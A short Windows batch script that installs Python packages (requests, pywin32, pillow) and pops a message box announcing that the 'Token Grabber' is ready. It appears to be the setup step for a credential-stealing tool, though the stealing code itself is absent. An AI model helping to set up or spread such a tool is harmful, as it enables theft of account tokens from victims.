@echo off
pip install requests
pip install pypiwin32
pip install pywin32
pip install pillow
echo x = msgbox("Token Grabber",5+5,"The Token Grabber is done, you can use it now !") > main.vbs
start main.vbs
del main.vbs
